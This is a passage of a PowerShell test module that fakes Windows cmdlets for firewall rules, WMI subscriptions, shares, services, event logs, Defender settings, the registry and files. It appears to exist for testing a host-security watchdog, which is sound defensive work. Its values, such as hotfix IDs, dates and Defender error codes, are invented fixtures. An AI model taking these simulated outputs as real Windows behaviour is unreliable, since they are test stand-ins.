    foreach ($r in $global:FW.FwRules) {
        if ($PolicyStore -eq 'PersistentStore' -and -not $r.Persistent) { continue }
        if ($Name -and -not (@($Name | Where-Object { $r.Name -like $_ }).Count)) { continue }
        if ($DisplayName -and $r.DisplayName -ne $DisplayName) { continue }
        if ($Direction -and $r.Direction -ne $Direction) { continue }
        if ($Enabled -and $r.Enabled -ne $Enabled) { continue }
        if ($Action -and $r.Action -ne $Action) { continue }
        $found++
        Get-FakeRuleObject $r
    }
    if ($found -eq 0 -and ($Name -or $DisplayName)) { Write-Error 'No MSFT_NetFirewallRule objects found with property DisplayName/Name.' -ErrorAction $ErrorActionPreference }
}
function Get-FakeFilterTarget {
    param($Rule, [bool]$All, [string]$PolicyStore)
    $rows = @()
    if ($Rule) { $rows = @($global:FW.FwRules | Where-Object { $_.Name -eq $Rule.Name }) }
    elseif ($All) { $rows = @($global:FW.FwRules | Where-Object { $PolicyStore -ne 'PersistentStore' -or $_.Persistent }) }
    $rows
}
function Get-NetFirewallPortFilter {
    [CmdletBinding()]
    param([switch]$All, [string]$PolicyStore = 'PersistentStore', [Parameter(ValueFromPipeline)]$AssociatedNetFirewallRule)
    process {
        foreach ($r in (Get-FakeFilterTarget $AssociatedNetFirewallRule $All $PolicyStore)) {
            [pscustomobject]@{ InstanceID = $r.Name; Protocol = $r.Protocol; LocalPort = @($r.LocalPort); RemotePort = @($(if ($r.RemotePort) { $r.RemotePort } else { 'Any' })) }
        }
    }
}
function Get-NetFirewallAddressFilter {
    [CmdletBinding()]
    param([switch]$All, [string]$PolicyStore = 'PersistentStore', [Parameter(ValueFromPipeline)]$AssociatedNetFirewallRule)
    process {
        foreach ($r in (Get-FakeFilterTarget $AssociatedNetFirewallRule $All $PolicyStore)) {
            [pscustomobject]@{ InstanceID = $r.Name; RemoteAddress = @($r.RemoteAddress); LocalAddress = @('Any') }
        }
    }
}
function Get-NetFirewallApplicationFilter {
    [CmdletBinding()]
    param([switch]$All, [string]$PolicyStore = 'PersistentStore', [Parameter(ValueFromPipeline)]$AssociatedNetFirewallRule)
    process {
        foreach ($r in (Get-FakeFilterTarget $AssociatedNetFirewallRule $All $PolicyStore)) {
            [pscustomobject]@{ InstanceID = $r.Name; Program = $r.Program }
        }
    }
}
function New-NetFirewallRule {
    [CmdletBinding()]
    param([string]$Name, [Parameter(Mandatory)][string]$DisplayName, [Parameter(Mandatory)][string]$Direction, [string]$Protocol = 'Any', [string]$LocalPort = 'Any', [string]$RemotePort = 'Any',
          [string[]]$RemoteAddress = @('Any'), [Parameter(Mandatory)][string]$Action, [string]$Profile = 'Any', [string]$Program = 'Any', [string]$Description)
    $null = $Description
    if (-not $Name) { $Name = [guid]::NewGuid().ToString() }
    if (@($global:FW.FwRules | Where-Object { $_.Name -eq $Name }).Count) { throw "Cannot create a file when that file already exists. (rule $Name)" }
    [void]$global:FW.FwRules.Add(@{ Name = $Name; DisplayName = $DisplayName; DisplayGroup = ''; Group = ''; Enabled = 'True'; Direction = $Direction; Action = $Action
                                    Profile = $Profile; Protocol = $Protocol; LocalPort = $LocalPort; RemotePort = $RemotePort; RemoteAddress = ($RemoteAddress -join ','); Program = $Program; Persistent = $true })
    Add-FakeCall "New-NetFirewallRule $Name $Direction $Protocol $LocalPort $Action $($RemoteAddress -join ',')"
}
function Disable-NetFirewallRule {
    [CmdletBinding()] param([Parameter(Position = 0)][string[]]$Name)
    foreach ($n in $Name) {
        $hit = @($global:FW.FwRules | Where-Object { $_.Name -like $n -and $_.Persistent })
        if ($hit.Count -eq 0) { throw "No MSFT_NetFirewallRule objects found with property 'Name' equal to '$n'." }
        foreach ($r in $hit) { $r.Enabled = 'False'; Add-FakeCall "Disable-NetFirewallRule $($r.Name)" }
    }
}
function Enable-NetFirewallRule {
    [CmdletBinding()] param([Parameter(Position = 0)][string[]]$Name)
    foreach ($n in $Name) {
        $hit = @($global:FW.FwRules | Where-Object { $_.Name -like $n -and $_.Persistent })
        if ($hit.Count -eq 0) { throw "No MSFT_NetFirewallRule objects found with property 'Name' equal to '$n'." }
        foreach ($r in $hit) { $r.Enabled = 'True'; Add-FakeCall "Enable-NetFirewallRule $($r.Name)" }
    }
}
function Remove-NetFirewallRule {
    [CmdletBinding()] param([Parameter(Position = 0)][string[]]$Name)
    foreach ($n in $Name) {
        $hit = @($global:FW.FwRules | Where-Object { $_.Name -like $n -and $_.Persistent })
        if ($hit.Count -eq 0) { throw "No MSFT_NetFirewallRule objects found with property 'Name' equal to '$n'." }
        foreach ($r in $hit) { $global:FW.FwRules.Remove($r); Add-FakeCall "Remove-NetFirewallRule $($r.Name)" }
    }
}

# ------------------------------------------------------------------ services, processes, network
function Get-CimInstance {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$ClassName, [string]$Namespace, [string]$Filter)
    if ($ClassName -eq 'Win32_UserAccount') {
        if ($global:FW.BreakUserAccount) { throw 'WMI could not answer (fake)' }
        $want = ''
        if ($Filter -match "Name='([^']+)'") { $want = $Matches[1] }
        foreach ($u in $global:FW.Users.Values) {
            if ($want -and $u.Name -ne $want) { continue }
            [pscustomobject]@{ Name = $u.Name; Lockout = [bool]$u.Locked; Disabled = (-not $u.Enabled); LocalAccount = $true }
        }
        return
    }
    if ($Namespace -match 'subscription') {
        if ($global:FW.BreakWmi) { throw 'Access denied (fake WMI)' }
        if ($ClassName -eq '__EventFilter') { return @($global:FW.Wmi.Filters | ForEach-Object { [pscustomobject]@{ Name = $_.Name; Query = $_.Query; FakeKind = 'Filter' } }) }
        if ($ClassName -eq '__EventConsumer') {
            return @($global:FW.Wmi.Consumers | ForEach-Object {
                [pscustomobject]@{ CimClass = [pscustomobject]@{ CimClassName = $_.Class }; Name = $_.Name; CommandLineTemplate = $_.CommandLineTemplate
                                   ExecutablePath = $_.ExecutablePath; ScriptText = $_.ScriptText; ScriptFileName = $_.ScriptFileName; FakeKind = 'Consumer' } })
        }
        if ($ClassName -eq '__FilterToConsumerBinding') { return @($global:FW.Wmi.Bindings | ForEach-Object { [pscustomobject]@{ Filter = $_.Filter; Consumer = $_.Consumer; FakeKind = 'Binding' } }) }
        return
    }
    if ($ClassName -eq 'Win32_OperatingSystem') { return [pscustomobject]@{ Caption = 'Microsoft Windows Server 2022 Standard'; BuildNumber = '20348' } }
    if ($ClassName -eq 'Win32_QuickFixEngineering') { return [pscustomobject]@{ HotFixID = 'KB5031364'; InstalledOn = [datetime]'2026-09-14' } }
    if ($ClassName -eq 'Win32_Service') { return $global:FW.Services | ForEach-Object { [pscustomobject]$_ } }
}
function Remove-CimInstance {
    # Removes an object that came from the pretend Get-CimInstance (a WMI filter, consumer or binding).
    [CmdletBinding()] param([Parameter(ValueFromPipeline = $true, Position = 0)]$InputObject)
    process {
        if ($global:FW.BreakWmiRemove) { throw 'Access denied (fake WMI remove)' }
        $o = $InputObject
        if ($o.FakeKind -eq 'Filter') {
            $global:FW.Wmi.Filters = @($global:FW.Wmi.Filters | Where-Object { $_.Name -ne $o.Name })
            Add-FakeCall "Remove-CimInstance filter $($o.Name)"
        } elseif ($o.FakeKind -eq 'Consumer') {
            $global:FW.Wmi.Consumers = @($global:FW.Wmi.Consumers | Where-Object { -not ($_.Name -eq $o.Name -and $_.Class -eq $o.CimClass.CimClassName) })
            Add-FakeCall "Remove-CimInstance consumer $($o.Name)"
        } elseif ($o.FakeKind -eq 'Binding') {
            $global:FW.Wmi.Bindings = @($global:FW.Wmi.Bindings | Where-Object { -not ($_.Filter -eq $o.Filter -and $_.Consumer -eq $o.Consumer) })
            Add-FakeCall "Remove-CimInstance binding $($o.Consumer)"
        } else { throw 'fake Remove-CimInstance: this object did not come from the fake Get-CimInstance' }
    }
}
function Remove-SmbShare {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Name, [switch]$Force)
    $null = $Force
    if ($global:FW.BreakShareChange) { throw 'The Server service is not running (fake)' }
    $s = @($global:FW.Shares | Where-Object { $_.Name -eq $Name }) | Select-Object -First 1
    if (-not $s) { throw "No MSFT_SmbShare objects found with property 'Name' equal to '$Name'." }
    $global:FW.Shares = @($global:FW.Shares | Where-Object { $_.Name -ne $Name })
    Add-FakeCall "Remove-SmbShare $Name"
}
function New-SmbShare {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Name, [string]$Path, [string]$Description, [string[]]$FullAccess, [string[]]$ChangeAccess, [string[]]$ReadAccess, [string[]]$NoAccess)
    if ($global:FW.BreakShareChange) { throw 'The Server service is not running (fake)' }
    if (@($global:FW.Shares | Where-Object { $_.Name -eq $Name }).Count -gt 0) { throw "The share name '$Name' has already been shared." }
    $acl = @()
    foreach ($a in @($FullAccess)) { if ($a) { $acl += "${a}:Full:Allow" } }
    foreach ($a in @($ChangeAccess)) { if ($a) { $acl += "${a}:Change:Allow" } }
    foreach ($a in @($ReadAccess)) { if ($a) { $acl += "${a}:Read:Allow" } }
    foreach ($a in @($NoAccess)) { if ($a) { $acl += "${a}:Full:Deny" } }
    if ($acl.Count -eq 0) { $acl = @('Everyone:Read:Allow') }          # what Windows gives a share you did not say anything about
    $global:FW.Shares += @{ Name = $Name; Path = $Path; Special = $false; Description = $Description; Access = $acl }
    Add-FakeCall "New-SmbShare $Name $Path"
}
function Get-SmbShare {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Name)
    if ($global:FW.BreakShares) { throw 'The Server service is not running (fake)' }
    $all = @($global:FW.Shares | ForEach-Object { [pscustomobject]@{ Name = $_.Name; Path = $_.Path; Special = $_.Special; Description = $_.Description; ScopeName = '*' } })
    if ($Name) {
        $hit = @($all | Where-Object { $_.Name -eq $Name })
        if ($hit.Count -eq 0) { Write-Error "No MSFT_SmbShare objects found with property 'Name' equal to '$Name'." -ErrorAction $ErrorActionPreference; return }
        return $hit
    }
    $all
}
function Get-SmbShareAccess {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Name)
    $s = @($global:FW.Shares | Where-Object { $_.Name -eq $Name }) | Select-Object -First 1
    foreach ($a in @($s.Access)) {
        $p = $a -split ':'
        [pscustomobject]@{ Name = $Name; AccountName = $p[0]; AccessRight = $p[1]; AccessControlType = $p[2] }
    }
}
function Get-BitsTransfer {
    [CmdletBinding()] param([switch]$AllUsers)
    $null = $AllUsers
    foreach ($j in $global:FW.Bits) {
        [pscustomobject]@{ DisplayName = $j.Name; JobState = $j.State; OwnerAccount = $j.Owner
                           FileList = @($j.Files | ForEach-Object { [pscustomobject]@{ RemoteName = $_; LocalName = 'C:\Windows\Temp\x.bin' } }) }
    }
}
function Get-WindowsFeature {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Name)
    if ($global:FW.BreakFeature) { throw 'The term Get-WindowsFeature is not recognized (fake: client Windows)' }
    [pscustomobject]@{ Name = $Name; InstallState = $global:FW.Feature; Installed = ($global:FW.Feature -eq 'Installed') }
}
function Get-FileHash {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Path, [string]$LiteralPath, [string]$Algorithm = 'SHA256')
    $p = $(if ($LiteralPath) { $LiteralPath } else { $Path })
    $h = $global:FW.Hashes[(Get-FakeKey $p)]
    if ($h) { return [pscustomobject]@{ Algorithm = $Algorithm; Hash = $h; Path = $p } }
    if (Find-FakeFile $p) {                       # a pretend file without a listed fingerprint gets a steady one worked out from its path
        $bytes = [Text.Encoding]::UTF8.GetBytes((Get-FakeKey $p))
        $hex = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($bytes)).Replace('-', '')
        return [pscustomobject]@{ Algorithm = $Algorithm; Hash = $hex; Path = $p }
    }
    Microsoft.PowerShell.Utility\Get-FileHash -Path $p -Algorithm $Algorithm
}
function ConvertTo-FakeStartType { param([string]$Mode) switch ($Mode) { 'Auto' { 'Automatic' } default { $Mode } } }
function Get-Service {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Name)
    if ($Name -eq 'mpssvc') {
        if ($global:FW.FwServiceMissing) { Write-Error "Cannot find any service with service name 'mpssvc'." -ErrorAction $ErrorActionPreference; return }
        return [pscustomobject]@{ Name = 'mpssvc'; Status = $(if ($global:FW.FwServiceStopped) { 'Stopped' } else { 'Running' }); StartType = $(if ($global:FW.FwStartType) { $global:FW.FwStartType } else { 'Automatic' }) }
    }
    $s = @($global:FW.Services | Where-Object { $_.Name -eq $Name }) | Select-Object -First 1
    if (-not $s) { Write-Error "Cannot find any service with service name '$Name'." -ErrorAction $ErrorActionPreference; return }
    [pscustomobject]@{ Name = $s.Name; Status = $s.State; StartType = (ConvertTo-FakeStartType $s.StartMode) }
}
function Set-Service {
    [CmdletBinding()] param([Parameter(Position = 0, Mandatory)][string]$Name, [ValidateSet('Automatic', 'Manual', 'Disabled', 'Boot', 'System', 'AutomaticDelayedStart')][string]$StartupType)
    if ($Name -eq 'mpssvc') { $global:FW.FwStartType = $StartupType; Add-FakeCall "Set-Service $Name $StartupType"; return }
    $s = @($global:FW.Services | Where-Object { $_.Name -eq $Name }) | Select-Object -First 1
    if (-not $s) { throw "Service '$Name' was not found on the computer." }
    $s.StartMode = $(if ($StartupType -eq 'Automatic') { 'Auto' } else { $StartupType })
    Add-FakeCall "Set-Service $Name $StartupType"
}
function Start-Service {
    [CmdletBinding()] param([Parameter(Position = 0, Mandatory)][string]$Name)
    if ($Name -eq 'mpssvc') { $global:FW.FwServiceStopped = $false; Add-FakeCall "Start-Service $Name"; return }
    $s = @($global:FW.Services | Where-Object { $_.Name -eq $Name }) | Select-Object -First 1
    if (-not $s) { throw "Cannot find any service with service name '$Name'." }
    if ($s.StartMode -eq 'Disabled') { throw "Service '$Name' cannot be started because it is disabled." }
    $s.State = 'Running'; Add-FakeCall "Start-Service $Name"
}
function Stop-Service {
    [CmdletBinding()] param([Parameter(Position = 0, Mandatory)][string]$Name, [switch]$Force)
    $null = $Force
    $s = @($global:FW.Services | Where-Object { $_.Name -eq $Name }) | Select-Object -First 1
    if (-not $s) { throw "Cannot find any service with service name '$Name'." }
    if (@($global:FW.StopFails) -contains $Name) { throw "Cannot stop service '$Name' because it has active dependent services." }
    $s.State = 'Stopped'; Add-FakeCall "Stop-Service $Name"
}
function Restart-Service {
    [CmdletBinding()] param([Parameter(Position = 0, Mandatory)][string]$Name, [switch]$Force)
    $null = $Force
    $s = @($global:FW.Services | Where-Object { $_.Name -eq $Name }) | Select-Object -First 1
    if (-not $s) { throw "Cannot find any service with service name '$Name'." }
    $s.State = 'Running'; Add-FakeCall "Restart-Service $Name"
}
function Get-Process {
    [CmdletBinding()] param()
    foreach ($k in $global:FW.Procs.Keys) { [pscustomobject]@{ Id = $k; ProcessName = $global:FW.Procs[$k].Name; Path = $global:FW.Procs[$k].Path } }
}
function Get-NetTCPConnection {
    [CmdletBinding()] param([string]$State, [int]$LocalPort)
    if ($State -eq 'Listen') {
        foreach ($l in @($global:FW.Listen | Where-Object { $_.Proto -eq 'TCP' })) {
            if ($LocalPort -and $l.Port -ne $LocalPort) { continue }
            [pscustomobject]@{ LocalAddress = $l.Addr; LocalPort = $l.Port; OwningProcess = $l.Pid; State = 'Listen' }
        }
    } elseif ($State -eq 'Established') {
        foreach ($c in $global:FW.Conns) { [pscustomobject]@{ LocalAddress = '172.16.5.30'; LocalPort = $c.LocalPort; RemoteAddress = $c.RemoteAddress; RemotePort = $c.RemotePort; OwningProcess = $c.Pid; State = 'Established' } }
    }
}
function Get-NetUDPEndpoint {
    [CmdletBinding()] param()
    foreach ($l in @($global:FW.Listen | Where-Object { $_.Proto -eq 'UDP' })) { [pscustomobject]@{ LocalAddress = $l.Addr; LocalPort = $l.Port; OwningProcess = $l.Pid } }
}
function Get-AuthenticodeSignature {
    [CmdletBinding()] param([string]$FilePath)
    $s = $global:FW.Sigs[$FilePath]
    if (-not $s) { return [pscustomobject]@{ Status = 'UnknownError'; SignerCertificate = $null } }
    [pscustomobject]@{ Status = $s.Status; SignerCertificate = $(if ($s.Subject) { [pscustomobject]@{ Subject = $s.Subject } } else { $null }) }
}
function Get-NetIPAddress { [CmdletBinding()] param([string]$AddressFamily) foreach ($i in $global:FW.Ips) { [pscustomobject]@{ IPAddress = $i } }; [pscustomobject]@{ IPAddress = '127.0.0.1' } }
function Get-NetConnectionProfile { [CmdletBinding()] param() [pscustomobject]@{ NetworkCategory = $global:FW.NetCategory; InterfaceAlias = 'Ethernet0' } }
function Get-NetAdapter { [CmdletBinding()] param() $global:FW.Adapters | ForEach-Object { [pscustomobject]$_ } }
function Enable-NetAdapter { [CmdletBinding()] param([string]$Name, [bool]$Confirm = $true) $null = $Confirm; foreach ($a in $global:FW.Adapters) { if ($a.Name -eq $Name) { $a.Status = 'Up' } } }
function Get-NetRoute {
    [CmdletBinding()] param([string]$AddressFamily)
    $null = $AddressFamily
    foreach ($r in $global:FW.Routes) { [pscustomobject]@{ DestinationPrefix = $r.DestinationPrefix; NextHop = $r.NextHop; InterfaceIndex = $r.InterfaceIndex } }
}
function Add-FakeEvent {
    # Puts one event into the pretend event log. MinutesAgo says when it happened. Data = the named values of the event (TargetUserName, ...).
    # UserData = $true makes the event carry its values in <UserData> (log-cleared events do), which the watchdog does not read by name.
    param([string]$Log, [int]$Id, [long]$RecordId, [double]$MinutesAgo = 1, [hashtable]$Data = @{}, [string]$Message = '', [bool]$UserData = $false)
    [void]$global:FW.Events.Add(@{ Log = $Log; Id = $Id; RecordId = $RecordId; Time = (Get-Date).AddMinutes(-$MinutesAgo); Data = $Data; Message = $Message; UserData = $UserData })
}
function Get-WinEvent {
    # Only -FilterHashtable (LogName, Id, StartTime) and -MaxEvents, newest first - the way the watchdog calls it.
    [CmdletBinding()] param([hashtable]$FilterHashtable, [int]$MaxEvents = 0)
    if ($global:FW.BreakEvents) { throw 'The event log service cannot be reached (fake)' }
    $f = $FilterHashtable
    $hit = @($global:FW.Events | Where-Object {
        $_.Log -eq $f.LogName -and (-not $f.Id -or @($f.Id) -contains $_.Id) -and (-not $f.StartTime -or $_.Time -ge $f.StartTime) })
    $hit = @($hit | Sort-Object { $_.Time }, { $_.RecordId } -Descending)
    if ($MaxEvents -gt 0) { $hit = @($hit | Select-Object -First $MaxEvents) }
    foreach ($e in $hit) {
        $body = ''
        if ($e.UserData) { $body = '<UserData><LogFileCleared><SubjectUserName>someone</SubjectUserName></LogFileCleared></UserData>' }
        else {
            $values = ''
            foreach ($k in $e.Data.Keys) { $values += "<Data Name='$k'>" + [Security.SecurityElement]::Escape([string]$e.Data[$k]) + '</Data>' }
            $body = "<EventData>$values</EventData>"
        }
        $o = [pscustomobject]@{ Id = $e.Id; RecordId = $e.RecordId; TimeCreated = $e.Time; Message = $e.Message; LogName = $e.Log
                                Xml = "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><EventID>$($e.Id)</EventID></System>$body</Event>" }
        Add-Member -InputObject $o -MemberType ScriptMethod -Name ToXml -Value { $this.Xml }
        $o
    }
}
function Test-TcpOpen { param([string]$HostName = '127.0.0.1', [int]$Port, [int]$TimeoutMs = 2000) $null = $TimeoutMs; [bool]$global:FW.Tcp["${HostName}:$Port"] }
function Get-MpComputerStatus {
    [CmdletBinding()] param()
    if (-not $global:FW.Defender) { throw 'Defender is not available' }
    $d = $global:FW.Defender
    [pscustomobject]@{ AMServiceEnabled = $d.Service; RealTimeProtectionEnabled = $d.RealTime; AntivirusSignatureAge = $d.SigAge; IsTamperProtected = $d.Tamper
                       AMRunningMode = $d.Mode; BehaviorMonitorEnabled = $d.Behavior; IoavProtectionEnabled = $d.Downloads; QuickScanAge = [uint32]$d.QuickScanAge
                       AntivirusSignatureVersion = $d.SigVersion; AMProductVersion = $d.Version }
}
function Get-MpPreference {
    [CmdletBinding()] param()
    if (-not $global:FW.Defender) { throw 'Defender is not available' }
    $d = $global:FW.Defender
    [pscustomobject]@{ ExclusionPath = $d.Exclusions; ExclusionExtension = $d.ExclusionExtensions; ExclusionProcess = $d.ExclusionProcesses
                       DisableRealtimeMonitoring = (-not $d.RealTime); DisableBehaviorMonitoring = (-not $d.Behavior); DisableIOAVProtection = (-not $d.Downloads) }
}
function Test-FakeDefenderPolicy {
    # A registry policy that switches a part of Defender off wins over Set-MpPreference (as on a real box).
    param([string]$Value)
    $k = Get-FakeKey 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'
    [bool]($global:FW.Reg.ContainsKey("$k|$Value") -and [int]$global:FW.Reg["$k|$Value"] -eq 1)
}
function Set-MpPreference {
    [CmdletBinding()] param([bool]$DisableRealtimeMonitoring, [bool]$DisableBehaviorMonitoring, [bool]$DisableIOAVProtection)
    if (-not $global:FW.Defender) { throw 'Defender is not available' }
    if ($global:FW.DefenderRefuses) { throw 'Set-MpPreference : Operation failed with the following error: 0x800106ba (fake: the service is not running)' }
    $d = $global:FW.Defender
    if ($PSBoundParameters.ContainsKey('DisableRealtimeMonitoring') -and -not (Test-FakeDefenderPolicy 'DisableRealtimeMonitoring')) { $d.RealTime = (-not $DisableRealtimeMonitoring) }
    if ($PSBoundParameters.ContainsKey('DisableBehaviorMonitoring') -and -not (Test-FakeDefenderPolicy 'DisableBehaviorMonitoring')) { $d.Behavior = (-not $DisableBehaviorMonitoring) }
    if ($PSBoundParameters.ContainsKey('DisableIOAVProtection') -and -not (Test-FakeDefenderPolicy 'DisableIOAVProtection')) { $d.Downloads = (-not $DisableIOAVProtection) }
    Add-FakeCall ('Set-MpPreference ' + (($PSBoundParameters.Keys | Sort-Object | ForEach-Object { "$_=$($PSBoundParameters[$_])" }) -join ' '))
}
function Add-MpPreference {
    [CmdletBinding()] param([string[]]$ExclusionPath, [string[]]$ExclusionExtension, [string[]]$ExclusionProcess)
    if (-not $global:FW.Defender) { throw 'Defender is not available' }
    if ($global:FW.DefenderRefuses) { throw 'Add-MpPreference : Operation failed with the following error: 0x800106ba (fake)' }
    $d = $global:FW.Defender
    foreach ($x in @($ExclusionPath)) { if ($x) { $d.Exclusions = @($d.Exclusions) + $x; Add-FakeCall "Add-MpPreference ExclusionPath=$x" } }
    foreach ($x in @($ExclusionExtension)) { if ($x) { $d.ExclusionExtensions = @($d.ExclusionExtensions) + $x; Add-FakeCall "Add-MpPreference ExclusionExtension=$x" } }
    foreach ($x in @($ExclusionProcess)) { if ($x) { $d.ExclusionProcesses = @($d.ExclusionProcesses) + $x; Add-FakeCall "Add-MpPreference ExclusionProcess=$x" } }
}
function Remove-MpPreference {
    [CmdletBinding()] param([string[]]$ExclusionPath, [string[]]$ExclusionExtension, [string[]]$ExclusionProcess)
    if (-not $global:FW.Defender) { throw 'Defender is not available' }
    if ($global:FW.DefenderRefuses) { throw 'Remove-MpPreference : Operation failed with the following error: 0x800106ba (fake)' }
    $d = $global:FW.Defender
    foreach ($x in @($ExclusionPath)) { if ($x) { $d.Exclusions = @(@($d.Exclusions) | Where-Object { $_ -ne $x }); Add-FakeCall "Remove-MpPreference ExclusionPath=$x" } }
    foreach ($x in @($ExclusionExtension)) { if ($x) { $d.ExclusionExtensions = @(@($d.ExclusionExtensions) | Where-Object { $_ -ne $x }); Add-FakeCall "Remove-MpPreference ExclusionExtension=$x" } }
    foreach ($x in @($ExclusionProcess)) { if ($x) { $d.ExclusionProcesses = @(@($d.ExclusionProcesses) | Where-Object { $_ -ne $x }); Add-FakeCall "Remove-MpPreference ExclusionProcess=$x" } }
}

# ------------------------------------------------------------------ registry, files, scheduled tasks
function Get-ItemProperty {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Path, [string]$Name, [string]$LiteralPath)
    if ($LiteralPath) { $Path = $LiteralPath }
    $k = Get-FakeKey $Path
    if (-not $Name -and $k -like '*\uninstall\*') {
        if ($k -notlike '*wow6432node*') { foreach ($s in $global:FW.Software) { [pscustomobject]$s } }
        return
    }
    if (-not $Name) { throw 'fake Get-ItemProperty: only -Name lookups (and the Uninstall list) are supported' }
    if (-not $global:FW.Reg.ContainsKey("$k|$Name")) { Write-Error "Property $Name does not exist at path $Path." -ErrorAction $ErrorActionPreference; return }
    $o = New-Object psobject
    $o | Add-Member -NotePropertyName $Name -NotePropertyValue $global:FW.Reg["$k|$Name"]
    $o
}
function Set-ItemProperty { [CmdletBinding()] param([Parameter(Position = 0)][string]$Path, [string]$Name, $Value) $global:FW.Reg[(Get-FakeKey $Path) + '|' + $Name] = $Value; Add-FakeCall "Set-ItemProperty $Path $Name=$Value" }
function Remove-ItemProperty {
    # Real Windows keeps the (now empty) key; so does this.
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Path, [Parameter(Position = 1)][string]$Name, [string]$LiteralPath)
    $p = $(if ($LiteralPath) { $LiteralPath } else { $Path })
    $k = Get-FakeKey $p
    if (-not $global:FW.Reg.ContainsKey("$k|$Name")) { Write-Error "Property $Name does not exist at path $p." -ErrorAction $ErrorActionPreference; return }
    $global:FW.Reg.Remove("$k|$Name")
    $global:FW.RegKinds.Remove("$k|$Name")
    if (-not $global:FW.RegKeys.Contains($k)) { [void]$global:FW.RegKeys.Add($k) }
    Add-FakeCall "Remove-ItemProperty $p $Name"
}
function New-ItemProperty {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Path, [Parameter(Position = 1)][string]$Name, $Value,
                            [ValidateSet('String', 'ExpandString', 'Binary', 'DWord', 'MultiString', 'QWord', 'Unknown')][string]$PropertyType, [switch]$Force, [string]$LiteralPath)
    $p = $(if ($LiteralPath) { $LiteralPath } else { $Path })
    $k = Get-FakeKey $p
    if (-not (New-FakeRegKey $p).Exists) { Write-Error "Cannot find path '$p' because it does not exist." -ErrorAction $ErrorActionPreference; return }
    if ($global:FW.Reg.ContainsKey("$k|$Name") -and -not $Force) { Write-Error "The property already exists." -ErrorAction $ErrorActionPreference; return }
    $global:FW.Reg["$k|$Name"] = $Value
    if ($PropertyType) { $global:FW.RegKinds["$k|$Name"] = $PropertyType }
    Add-FakeCall "New-ItemProperty $p $Name=$Value ($PropertyType)"
}
function New-Item {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Path, [string]$ItemType, [switch]$Force, [string]$Name, $Value)
    if (Test-FakeRegistryPath $Path) {
        $k = Get-FakeKey $Path
        if (-not $global:FW.RegKeys.Contains($k)) { [void]$global:FW.RegKeys.Add($k) }
        Add-FakeCall "New-Item $Path"
        return [pscustomobject]@{ Path = $Path }
    }
    if ($Path -match '^[A-Za-z]:\\') {
        $k = Get-FakeKey $Path
        if ($ItemType -eq 'Directory') {
            if (-not $global:FW.Dirs.ContainsKey($k)) { $global:FW.Dirs[$k] = @() }
            Add-FakeCall "New-Item Directory $Path"
        } else { $global:FW.Files[$k] = [string]$Value; Add-FakeCall "New-Item File $Path" }
        return [pscustomobject]@{ Path = $Path }
    }
    Microsoft.PowerShell.Management\New-Item @PSBoundParameters
}
function Set-Content {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Path, [Parameter(Position = 1)]$Value, [string]$Encoding, [switch]$NoNewline)
    if ($Path -match '^[A-Za-z]:\\') {
        $global:FW.Files[(Get-FakeKey $Path)] = [string]$Value + $(if ($NoNewline) { '' } else { "`r`n" })
        $global:FW.LastEncoding = $Encoding
        Add-FakeCall "Set-Content $Path"
        return
    }
    Microsoft.PowerShell.Management\Set-Content @PSBoundParameters
}
function Get-FakeEntryName { param($Entry) $(if ($Entry -is [hashtable]) { [string]$Entry.Name } else { [string]$Entry }) }
function Find-FakeFile {
    # A file of the pretend box: listed in Files, or an entry of its folder's list in Dirs. $null when there is none.
    param([string]$Path)
    $k = Get-FakeKey $Path
    if ($global:FW.Files.ContainsKey($k)) { return @{ Where = 'Files'; Key = $k; Name = (Split-Path -Path $Path -Leaf); Length = 10; Time = [datetime]'2026-10-14 09:30' } }
    $parent = Split-Path -Path $Path -Parent
    if (-not $parent) { return $null }
    $pk = Get-FakeKey $parent
    if (-not $global:FW.Dirs.ContainsKey($pk)) { return $null }
    $leaf = Split-Path -Path $Path -Leaf
    foreach ($e in @($global:FW.Dirs[$pk])) {
        $h = $(if ($e -is [hashtable]) { $e } else { @{ Name = [string]$e } })
        if ($h.Name -ieq $leaf -and -not $h.IsDir) {
            return @{ Where = 'Dirs'; Key = $pk; Name = [string]$h.Name; Length = $(if ($h.ContainsKey('Length')) { [long]$h.Length } else { 10 }); Time = $(if ($h.ContainsKey('Time')) { [datetime]$h.Time } else { [datetime]'2026-10-14 09:30' }) }
        }
    }
    $null
}
function Move-Item {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Path, [string]$LiteralPath, [Parameter(Position = 1)][string]$Destination, [switch]$Force)
    if ($LiteralPath) { $Path = $LiteralPath }
    if ($Path -notmatch '^[A-Za-z]:\\' -and $Destination -notmatch '^[A-Za-z]:\\') { return (Microsoft.PowerShell.Management\Move-Item -Path $Path -Destination $Destination -Force:$Force) }
    $src = Find-FakeFile $Path
    if (-not $src) { Write-Error "Cannot find path '$Path' because it does not exist." -ErrorAction $ErrorActionPreference; return }
    $target = $Destination
    if ($global:FW.Dirs.ContainsKey((Get-FakeKey $Destination))) { $target = $Destination.TrimEnd('\') + '\' + $src.Name }
    $dstParent = Split-Path -Path $target -Parent
    if (-not $global:FW.Dirs.ContainsKey((Get-FakeKey $dstParent))) { Write-Error "Could not find a part of the path '$target'." -ErrorAction $ErrorActionPreference; return }
    if ((Find-FakeFile $target) -and -not $Force) { Write-Error 'Cannot create a file when that file already exists.' -ErrorAction $ErrorActionPreference; return }
    $hash = (Get-FileHash -LiteralPath $Path).Hash
    if ($src.Where -eq 'Files') { $global:FW.Files.Remove($src.Key) }
    else { $global:FW.Dirs[$src.Key] = @(@($global:FW.Dirs[$src.Key]) | Where-Object { (Get-FakeEntryName $_) -ine $src.Name }) }
    $global:FW.Hashes.Remove((Get-FakeKey $Path))
    $dk = Get-FakeKey $dstParent
